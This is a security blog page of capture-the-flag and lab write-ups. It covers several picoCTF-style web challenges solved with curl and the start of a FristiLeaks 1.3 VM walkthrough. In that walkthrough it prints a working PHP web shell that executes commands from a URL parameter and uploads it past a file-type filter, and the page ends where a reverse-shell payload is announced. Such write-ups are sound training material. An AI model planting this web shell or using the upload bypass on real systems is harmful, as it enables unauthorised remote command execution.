<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CFSS | SecFortess</title>
<meta name="keywords" content="">
<meta name="description" content="Challenge 1. We are given this challenge
Using curl we can see the that we need to make a POST request together with the username and password parameter
‚ùØ curl http://165.227.106.113/post.php &lt;h1&gt;This site takes POST data that you have not submitted!&lt;/h1&gt;&lt;!-- username: admin | password: 71urlkufpsdnlkadsf --&gt; We can then use curl again this time specifying the -X flag for POST request and -d for data
‚ùØ curl http://165.227.106.113/post.php -X POST -d username=admin -d password=71urlkufpsdnlkadsf &lt;h1&gt;flag{p0st_d4t4_4ll_d4y}&lt;/h1&gt; Challenge 2.">
<meta name="author" content="SecFortress">
<link rel="canonical" href="http://localhost:1313/hacking/cfss/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/cfss/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
  

<meta property="og:title" content="CFSS" />
<meta property="og:description" content="Challenge 1. We are given this challenge
Using curl we can see the that we need to make a POST request together with the username and password parameter
‚ùØ curl http://165.227.106.113/post.php &lt;h1&gt;This site takes POST data that you have not submitted!&lt;/h1&gt;&lt;!-- username: admin | password: 71urlkufpsdnlkadsf --&gt; We can then use curl again this time specifying the -X flag for POST request and -d for data
‚ùØ curl http://165.227.106.113/post.php -X POST -d username=admin -d password=71urlkufpsdnlkadsf &lt;h1&gt;flag{p0st_d4t4_4ll_d4y}&lt;/h1&gt; Challenge 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/hacking/cfss/" /><meta property="article:section" content="hacking" />
<meta property="article:published_time" content="2024-08-26T22:39:10+01:00" />
<meta property="article:modified_time" content="2024-08-26T22:39:10+01:00" /><meta property="og:site_name" content="SecFortress" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CFSS"/>
<meta name="twitter:description" content="Challenge 1. We are given this challenge
Using curl we can see the that we need to make a POST request together with the username and password parameter
‚ùØ curl http://165.227.106.113/post.php &lt;h1&gt;This site takes POST data that you have not submitted!&lt;/h1&gt;&lt;!-- username: admin | password: 71urlkufpsdnlkadsf --&gt; We can then use curl again this time specifying the -X flag for POST request and -d for data
‚ùØ curl http://165.227.106.113/post.php -X POST -d username=admin -d password=71urlkufpsdnlkadsf &lt;h1&gt;flag{p0st_d4t4_4ll_d4y}&lt;/h1&gt; Challenge 2."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Hackings",
      "item": "http://localhost:1313/hacking/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CFSS",
      "item": "http://localhost:1313/hacking/cfss/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CFSS",
  "name": "CFSS",
  "description": "Challenge 1. We are given this challenge\nUsing curl we can see the that we need to make a POST request together with the username and password parameter\n‚ùØ curl http://165.227.106.113/post.php \u0026lt;h1\u0026gt;This site takes POST data that you have not submitted!\u0026lt;/h1\u0026gt;\u0026lt;!-- username: admin | password: 71urlkufpsdnlkadsf --\u0026gt; We can then use curl again this time specifying the -X flag for POST request and -d for data\n‚ùØ curl http://165.227.106.113/post.php -X POST -d username=admin -d password=71urlkufpsdnlkadsf \u0026lt;h1\u0026gt;flag{p0st_d4t4_4ll_d4y}\u0026lt;/h1\u0026gt; Challenge 2.",
  "keywords": [
    
  ],
  "articleBody": "Challenge 1. We are given this challenge\nUsing curl we can see the that we need to make a POST request together with the username and password parameter\n‚ùØ curl http://165.227.106.113/post.php This site takes POST data that you have not submitted! We can then use curl again this time specifying the -X flag for POST request and -d for data\n‚ùØ curl http://165.227.106.113/post.php -X POST -d username=admin -d password=71urlkufpsdnlkadsf flag{p0st_d4t4_4ll_d4y} Challenge 2. We are given the following challenge\nFirst of all we make a request with curl and we can see that we have a user agent problem specifying the user agent to be used in comment, Sup3rS3cr3tAg3nt.\n‚ùØ curl http://165.227.106.113/header.php Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: curl/8.6.0 Using the specified user agent with the -A flag we have another error saying we need to come form awesomesauce.com\n‚ùØ curl http://165.227.106.113/header.php -A Sup3rS3cr3tAg3nt Sorry, it seems as if you did not just come from the site, \"awesomesauce.com\". We can specify the awesomesauce.com website by using the --referer option.\n‚ùØ curl http://165.227.106.113/header.php -A Sup3rS3cr3tAg3nt --referer awesomesauce.com Here is your flag: flag{did_this_m3ss_with_y0ur_h34d} Challenge 3. We are given the following challenge\nViewing source code i couldn‚Äôt find any password. However there is something wrong about the URL as navigating to /where-am-i redirects me to /where-am-i?getoutofhere. Decided to use burp to analyze this and found the password. We submitted the password and we have this page\nChallenge 4. We are given the following challenge :\nWe just need a little bit of research skills here, which led me to this.\nAs requested we can go ahead and submit flag format as ; picoCTF{CVE-2021-34527}.\nChallenge 5. We are given the following challenge\nNavigating to the website we have an upload function saying we should upload 2 files.\nI started by uploading 2 PDF files which are the same, as the website only accepts PDF file types. This gave me an error saying we must upload 2 different PDF files.\n‚Ä¶.Then i get another error saying ‚ÄúMD5 hashes do not match‚Äù, This made me understand that different files are judged by one MD5 hash, weird!!\nStarted to look up google and ended up with the search term ‚ÄúWhat is a MD5 collision attack?‚Äù\nThis led me to this GitHub respository with 2 files each which has the same MD5. we can download the following files as shown in the below screenshot.\nUploading this 2 files we got the following flag and bypassed the filter in place.\nChallenge 6. We are given the following challenge :\nI made a curl request to the default web page as usual and got the following page, in summary asking ‚Äúwhere are the robots?‚Äù.\n‚ùØ curl http://jupiter.challenges.picoctf.org:60915/ \u003c!doctype html\u003e Welcome ",
  "wordCount" : "3589",
  "inLanguage": "en",
  "datePublished": "2024-08-26T22:39:10+01:00",
  "dateModified": "2024-08-26T22:39:10+01:00",
  "author":{
    "@type": "Person",
    "name": "SecFortress"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/hacking/cfss/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "SecFortess",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="SecFortress (Alt + H)">
                <img src="https://i.imgur.com/mStB3iJ.jpeg" alt="" aria-label="logo"
                    height="25">SecFortress</a>
            <div class="logo-switches">
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/hacking" title="ü•∑ Hacking">
                    <span>ü•∑ Hacking</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://sec-fortress.github.io/" title="‚úçÔ∏è Blog">
                    <span>‚úçÔ∏è Blog</span>&nbsp;
                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
                        <path d="M15 3h6v6"></path>
                        <path d="M10 14L21 3"></path>
                    </svg>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/whoami" title="üá≥üá¨ Whoami">
                    <span>üá≥üá¨ Whoami</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;¬ª&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
    <h1 class="post-title entry-hint-parent">
      CFSS
    </h1>
    <div class="post-meta"><span title='2024-08-26 22:39:10 +0100 WAT'>August 26, 2024</span>&nbsp;¬∑&nbsp;17 min&nbsp;¬∑&nbsp;SecFortress

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#challenge-1">Challenge 1.</a></li>
    <li><a href="#challenge-2">Challenge 2.</a></li>
    <li><a href="#challenge-3">Challenge 3.</a></li>
    <li><a href="#challenge-4">Challenge 4.</a></li>
    <li><a href="#challenge-5">Challenge 5.</a></li>
    <li><a href="#challenge-6">Challenge 6.</a></li>
    <li><a href="#challenge-7---fristileaks-13">Challenge 7 - FristiLeaks: 1.3</a>
      <ul>
        <li></li>
      </ul>
    </li>
    <li><a href="#challenge-8---hacklab-vulnix">Challenge 8 - HackLAB: Vulnix</a>
      <ul>
        <li></li>
      </ul>
    </li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="challenge-1">Challenge 1.<a hidden class="anchor" aria-hidden="true" href="#challenge-1">#</a></h2>
<p>We are given this challenge</p>
<p><img loading="lazy" src="https://i.imgur.com/nSP2Uc5.png" alt=""  />
</p>
<p>Using curl we can see the  that we need to make a POST request together with the username and password parameter</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ curl http://165.227.106.113/post.php
</span></span><span class="line"><span class="cl">&lt;h1&gt;This site takes POST data that you have not submitted!&lt;/h1&gt;&lt;!-- username: admin <span class="p">|</span> password: 71urlkufpsdnlkadsf --&gt; 
</span></span></code></pre></div><p>We can then use curl again this time specifying the <code>-X</code> flag for POST request and <code>-d</code> for data</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ curl http://165.227.106.113/post.php -X POST -d <span class="nv">username</span><span class="o">=</span>admin -d <span class="nv">password</span><span class="o">=</span>71urlkufpsdnlkadsf
</span></span><span class="line"><span class="cl">&lt;h1&gt;flag<span class="o">{</span>p0st_d4t4_4ll_d4y<span class="o">}</span>&lt;/h1&gt;
</span></span></code></pre></div><h2 id="challenge-2">Challenge 2.<a hidden class="anchor" aria-hidden="true" href="#challenge-2">#</a></h2>
<p>We are given the following challenge</p>
<p><img loading="lazy" src="https://i.imgur.com/o70t1hn.png" alt=""  />
</p>
<p>First of all we make a request with curl and we can see that we have a user agent problem specifying the user agent to be used in comment, <code>Sup3rS3cr3tAg3nt</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ curl http://165.227.106.113/header.php
</span></span><span class="line"><span class="cl">Sorry, it seems as <span class="k">if</span> your user agent is not correct, in order to access this website. The one you supplied is: curl/8.6.0
</span></span><span class="line"><span class="cl">&lt;!-- Sup3rS3cr3tAg3nt  --&gt;
</span></span></code></pre></div><p>Using the specified user agent with the <code>-A</code> flag we have another error saying we need to come form <a href="awesomesauce.com">awesomesauce.com</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ curl http://165.227.106.113/header.php -A Sup3rS3cr3tAg3nt
</span></span><span class="line"><span class="cl">Sorry, it seems as <span class="k">if</span> you did not just come from the site, <span class="s2">&#34;awesomesauce.com&#34;</span>.
</span></span><span class="line"><span class="cl">&lt;!-- Sup3rS3cr3tAg3nt  --&gt;
</span></span></code></pre></div><p>We can specify the <a href="awesomesauce.com">awesomesauce.com</a> website by using the <code>--referer</code> option.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ curl http://165.227.106.113/header.php -A Sup3rS3cr3tAg3nt --referer awesomesauce.com
</span></span><span class="line"><span class="cl">Here is your flag: flag<span class="o">{</span>did_this_m3ss_with_y0ur_h34d<span class="o">}</span>
</span></span><span class="line"><span class="cl">&lt;!-- Sup3rS3cr3tAg3nt  --&gt;
</span></span></code></pre></div><h2 id="challenge-3">Challenge 3.<a hidden class="anchor" aria-hidden="true" href="#challenge-3">#</a></h2>
<p>We are given the following challenge</p>
<p><img loading="lazy" src="https://i.imgur.com/kQPtC9W.png" alt=""  />
</p>
<ul>
<li>Viewing source code i couldn&rsquo;t find any password.</li>
<li>However there is something wrong about the URL as navigating to <code>/where-am-i</code> redirects me to <code>/where-am-i?getoutofhere</code>.</li>
<li>Decided to use burp to analyze this and found the password.</li>
</ul>
<p><img loading="lazy" src="https://i.imgur.com/qqZgTam.png" alt=""  />
</p>
<p>We submitted the password and we have this page</p>
<p><img loading="lazy" src="https://i.imgur.com/HCg2nM2.png" alt=""  />
</p>
<h2 id="challenge-4">Challenge 4.<a hidden class="anchor" aria-hidden="true" href="#challenge-4">#</a></h2>
<p>We are given the following challenge :</p>
<p><img loading="lazy" src="https://i.imgur.com/vCqe3YS.png" alt=""  />
</p>
<p>We just need a little bit of research skills here, which led me to this.</p>
<p><img loading="lazy" src="https://i.imgur.com/SLKnuKa.png" alt=""  />
</p>
<p>As requested we can go ahead and submit flag format as ; <code>picoCTF{CVE-2021-34527}</code>.</p>
<p><img loading="lazy" src="https://i.imgur.com/eoaCzzM.png" alt=""  />
</p>
<h2 id="challenge-5">Challenge 5.<a hidden class="anchor" aria-hidden="true" href="#challenge-5">#</a></h2>
<p>We are given the following challenge</p>
<p><img loading="lazy" src="https://i.imgur.com/zzK5eKo.png" alt=""  />
</p>
<p>Navigating to the website we have an upload function saying we should upload 2 files.</p>
<p><img loading="lazy" src="https://i.imgur.com/eza7Kvz.png" alt=""  />
</p>
<p>I started by uploading 2 PDF files which are the same, as the website only accepts PDF file types. This gave me an error saying we must upload 2 different PDF files.</p>
<p><img loading="lazy" src="https://i.imgur.com/KCect1I.png" alt=""  />
</p>
<p>&hellip;.Then i get another error saying <em><strong>&ldquo;MD5 hashes do not match&rdquo;</strong></em>, This made me understand that different files are judged by one MD5 hash, weird!!</p>
<p><img loading="lazy" src="https://i.imgur.com/o6OXfrX.png" alt=""  />
</p>
<p>Started to look up google and ended up with the search term &ldquo;<em><strong>What is a MD5 collision attack?</strong></em>&rdquo;</p>
<p><img loading="lazy" src="https://i.imgur.com/KZQKWZe.png" alt=""  />
</p>
<p>This led me to this <a href="https://github.com/corkami/collisions/tree/master/examples/free">GitHub</a> respository with 2 files each which has the same MD5. we can download the following files as shown in the below screenshot.</p>
<p><img loading="lazy" src="https://i.imgur.com/uLWkETL.png" alt=""  />
</p>
<p>Uploading this 2 files we got the following flag and bypassed the filter in place.</p>
<p><img loading="lazy" src="https://i.imgur.com/cR58ubA.png" alt=""  />
</p>
<h2 id="challenge-6">Challenge 6.<a hidden class="anchor" aria-hidden="true" href="#challenge-6">#</a></h2>
<p>We are given the following challenge :</p>
<p><img loading="lazy" src="https://i.imgur.com/tUPfydV.png" alt=""  />
</p>
<p>I made a curl request to the default web page as usual and got the following page, in summary asking <em><strong>&ldquo;where are the robots?&rdquo;</strong></em>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ curl http://jupiter.challenges.picoctf.org:60915/
</span></span><span class="line"><span class="cl">&lt;!doctype html&gt;
</span></span><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl">  &lt;head&gt;
</span></span><span class="line"><span class="cl">    &lt;title&gt;Welcome&lt;/title&gt;
</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;https://fonts.googleapis.com/css?family=Monoton|Roboto&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span>&gt;
</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;style.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl">  &lt;/head&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  &lt;body&gt;
</span></span><span class="line"><span class="cl">    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;container&#34;</span>&gt;
</span></span><span class="line"><span class="cl">      &lt;header&gt;
</span></span><span class="line"><span class="cl">	&lt;h1&gt;Welcome&lt;/h1&gt;
</span></span><span class="line"><span class="cl">      &lt;/header&gt;
</span></span><span class="line"><span class="cl">      &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;content&#34;</span>&gt;
</span></span><span class="line"><span class="cl">	&lt;p&gt;Where are the robots?&lt;/p&gt;
</span></span><span class="line"><span class="cl">      &lt;/div&gt;
</span></span><span class="line"><span class="cl">      &lt;footer&gt;&lt;/footer&gt;
</span></span><span class="line"><span class="cl">    &lt;/div&gt;
</span></span><span class="line"><span class="cl">  &lt;/body&gt;
</span></span><span class="line"><span class="cl">&lt;/html&gt;
</span></span></code></pre></div><p>Since by default <code>robots</code> are stored at <code>/robots.txt</code> which <em>tells search engine crawlers which URLs the crawler can access on your site</em>. We can go ahead and make a curl request to the endpoint.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ curl http://jupiter.challenges.picoctf.org:60915/robots.txt
</span></span><span class="line"><span class="cl">User-agent: *
</span></span><span class="line"><span class="cl">Disallow: /8028f.html
</span></span></code></pre></div><p>This shows that there is a <code>/8028f.html</code> endpoint in which we can go ahead and make another curl request to, giving us our flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ curl http://jupiter.challenges.picoctf.org:60915/8028f.html
</span></span><span class="line"><span class="cl">&lt;!doctype html&gt;
</span></span><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl">  &lt;head&gt;
</span></span><span class="line"><span class="cl">    &lt;title&gt;Where are the robots&lt;/title&gt;
</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;https://fonts.googleapis.com/css?family=Monoton|Roboto&#34;</span> <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span>&gt;
</span></span><span class="line"><span class="cl">    &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;style.css&#34;</span>&gt;
</span></span><span class="line"><span class="cl">  &lt;/head&gt;
</span></span><span class="line"><span class="cl">  &lt;body&gt;
</span></span><span class="line"><span class="cl">    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;container&#34;</span>&gt;
</span></span><span class="line"><span class="cl">      
</span></span><span class="line"><span class="cl">      &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;content&#34;</span>&gt;
</span></span><span class="line"><span class="cl">	&lt;p&gt;Guess you found the robots&lt;br /&gt;
</span></span><span class="line"><span class="cl">	  &lt;flag&gt;picoCTF<span class="o">{</span>ca1cu1at1ng_Mach1n3s_8028f<span class="o">}</span>&lt;/flag&gt;&lt;/p&gt;
</span></span><span class="line"><span class="cl">      &lt;/div&gt;
</span></span><span class="line"><span class="cl">      &lt;footer&gt;&lt;/footer&gt;
</span></span><span class="line"><span class="cl">  &lt;/body&gt;
</span></span><span class="line"><span class="cl">&lt;/html&gt;
</span></span></code></pre></div><p>Go ahead and submit the flag</p>
<p><img loading="lazy" src="https://i.imgur.com/ttiNSw8.png" alt=""  />
</p>
<h2 id="challenge-7---fristileaks-13">Challenge 7 - FristiLeaks: 1.3<a hidden class="anchor" aria-hidden="true" href="#challenge-7---fristileaks-13">#</a></h2>
<h4 id="about">About:<a hidden class="anchor" aria-hidden="true" href="#about">#</a></h4>
<pre tabindex="0"><code>Name: Fristileaks 1.3
Author: Ar0xA
Series: Fristileaks
Style: Enumeration/Follow the breadcrumbs
Goal: get root (uid 0) and read the flag file
Tester(s): dqi, barrebas
Difficulty: Basic
</code></pre><h4 id="description">Description:<a hidden class="anchor" aria-hidden="true" href="#description">#</a></h4>
<pre tabindex="0"><code>A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..
</code></pre><h4 id="instruction">Instruction:<a hidden class="anchor" aria-hidden="true" href="#instruction">#</a></h4>
<pre tabindex="0"><code>VMware users will need to manually edit the VM&#39;s MAC address to: 08:00:27:A5:A6:76
</code></pre><p>We start by running a network scan using the <code>arp-scan</code> utility.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ sudo arp-scan -l
</span></span><span class="line"><span class="cl">Interface: wlan0, type: EN10MB, MAC: 1c:4d:70:2c:34:13, IPv4: 192.168.0.158
</span></span><span class="line"><span class="cl">Starting arp-scan 1.10.0 with <span class="m">256</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
</span></span><span class="line"><span class="cl">192.168.0.1     98:a9:42:2c:e9:d3       Guangzhou Tozed Kangwei Intelligent Technology Co., LTD
</span></span><span class="line"><span class="cl">192.168.0.134   1c:4d:70:2c:34:13       Intel Corporate
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">2</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span></span><span class="line"><span class="cl">Ending arp-scan 1.10.0: <span class="m">256</span> hosts scanned in 2.068 seconds <span class="o">(</span>123.79 hosts/sec<span class="o">)</span>. <span class="m">2</span> responded
</span></span></code></pre></div><p>Then running an nmap scan we have</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.94SVN scan initiated Sun Aug 25 11:13:17 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt 192.168.0.134</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.0.134
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00046s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65409</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>, <span class="m">125</span> filtered tcp ports <span class="o">(</span>host-unreach<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.2.15 <span class="o">((</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   Supported Methods: GET HEAD POST OPTIONS TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.2.15 <span class="o">(</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">3</span> disallowed entries 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_/cola /sisi /beer
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Sun Aug 25 11:15:25 2024 -- 1 IP address (1 host up) scanned in 127.54 seconds</span>
</span></span></code></pre></div><p>Using curl to check for existence of <code>/robots.txt</code> we have</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">‚ùØ curl http://192.168.0.134/robots.txt
</span></span><span class="line"><span class="cl">User-agent: *
</span></span><span class="line"><span class="cl">Disallow: /cola
</span></span><span class="line"><span class="cl">Disallow: /sisi
</span></span><span class="line"><span class="cl">Disallow: /beer
</span></span></code></pre></div><p>This 3 directories provides us with the same image which after analysis has nothing to show at all</p>
<p><img loading="lazy" src="https://i.imgur.com/2qUqv0k.png" alt=""  />
</p>
<p>I also tried to fuzz through this discovered endpoints, but nothing also, then i decided to guess the directories trying <code>/fristileaks</code> first and <code>/fristi</code> which gave us this admin portal</p>
<p><img loading="lazy" src="https://i.imgur.com/NirOTbU.png" alt=""  />
</p>
<p>I tried admin default credentials including SQLi attacks but to no avail so i decided to view source code</p>
<ol>
<li>Found out that a user called <code>eezeepz</code> has stored junk base64 data in this source code</li>
</ol>
<p><img loading="lazy" src="https://i.imgur.com/O45MCkM.png" alt=""  />
</p>
<ol start="2">
<li>Scrolling down i found the base64 encoded message and since as instructed it is an image we will try and do <code>base642png</code> for this scenario.</li>
</ol>
<p><img loading="lazy" src="https://i.imgur.com/dRhmk9i.png" alt=""  />
</p>
<p>Then browsed to this <a href="https://base64.guru/converter/decode/image/png">website</a> and indeed we have a base64 decoded image, waiting for us.</p>
<p><img loading="lazy" src="https://i.imgur.com/zHdoPNr.png" alt=""  />
</p>
<p>I thought that this was the password to the <code>eezeepz</code> user and as much as i thought, yes it is cos i was able to login with password <code>keKkeKKeKKeKkEkkEk</code> and got a upload page</p>
<p><img loading="lazy" src="https://i.imgur.com/pUyTlMw.png" alt=""  />
</p>
<p>After several trial and error i was able to upload the below content with file name as <code>rev.php.png</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&#34;GET&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;&lt;?php echo basename(</span><span class="si">$_SERVER[&#39;PHP_SELF&#39;]</span><span class="s2">); ?&gt;&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;TEXT&#34;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;cmd&#34;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;cmd&#34;</span> <span class="nx">size</span><span class="o">=</span><span class="s2">&#34;80&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;SUBMIT&#34;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&#34;Execute&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/pre&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/body&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;script&gt;document.getElementById(&#34;cmd&#34;).focus();&lt;/script&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;/html&gt;
</span></span></span></code></pre></div><p>Then accessing the file on the <code>/uploads</code> directory we have a web shell, hehe</p>
<p><img loading="lazy" src="https://i.imgur.com/2lJzuEt.png" alt=""  />
</p>
<p>You can then attempt to gain a reverse shell with the below payload;</p>
